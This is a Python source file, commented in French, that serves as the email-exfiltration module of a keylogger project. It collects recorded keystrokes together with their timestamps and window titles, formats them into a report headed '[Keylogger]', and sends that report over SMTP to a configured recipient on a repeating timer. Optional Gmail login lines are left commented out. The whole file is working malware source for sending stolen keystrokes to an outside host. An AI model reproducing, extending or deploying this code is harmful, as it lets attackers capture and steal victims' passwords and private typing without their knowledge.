# ============================================================
#  exfil/mailer.py — Exfiltration par email (SMTP)
#  Rôle : récupérer les logs et les envoyer par email
#         à intervalle régulier
# ============================================================

import smtplib
import time
import sys
import os
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
from storage.logger import get_last
from config import (
    SMTP_SERVER, SMTP_PORT,
    EMAIL_FROM, EMAIL_TO, EMAIL_PASSWORD,
    SEND_INTERVAL, MAX_KEYS_EMAIL
)


def build_email(rows):
    """Construit l'objet email à partir des frappes."""
    msg = MIMEMultipart("alternative")
    msg["From"]    = EMAIL_FROM
    msg["To"]      = EMAIL_TO
    msg["Subject"] = f"[Keylogger] Rapport — {datetime.now().strftime('%Y-%m-%d %H:%M')}"

    if not rows:
        body = "Aucune frappe depuis le dernier envoi."
    else:
        lines = [f"[{ts}] {win} → {key}" for ts, key, win in rows]
        body  = f"Frappes ({len(rows)}) :\n\n" + "\n".join(lines)

    msg.attach(MIMEText(body, "plain", "utf-8"))
    return msg


def send_mail():
    """Récupère les logs et les envoie par email."""
    rows = get_last(MAX_KEYS_EMAIL)

    if not rows:
        print("[Mailer] Rien à envoyer.")
        return

    msg = build_email(rows)

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            # Pour Gmail : décommente ces deux lignes
            # server.starttls()
            # server.login(EMAIL_FROM, EMAIL_PASSWORD)
            server.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
        print(f"[Mailer] ✅ {len(rows)} frappes envoyées")

    except ConnectionRefusedError:
        print("[Mailer] ❌ Connexion refusée — MailHog lancé ?")
    except smtplib.SMTPAuthenticationError:
        print("[Mailer] ❌ Mauvais mot de passe")
    except Exception as e:
        print(f"[Mailer] ❌ {e}")


class Mailer:
    def __init__(self):
        self.running = False

    def start(self):
        self.running = True
        print(f"[Mailer] Démarré — envoi toutes les {SEND_INTERVAL // 60} min")
        while self.running:
            send_mail()
            time.sleep(SEND_INTERVAL)

    def stop(self):
        self.running = False


if __name__ == "__main__":
    send_mail()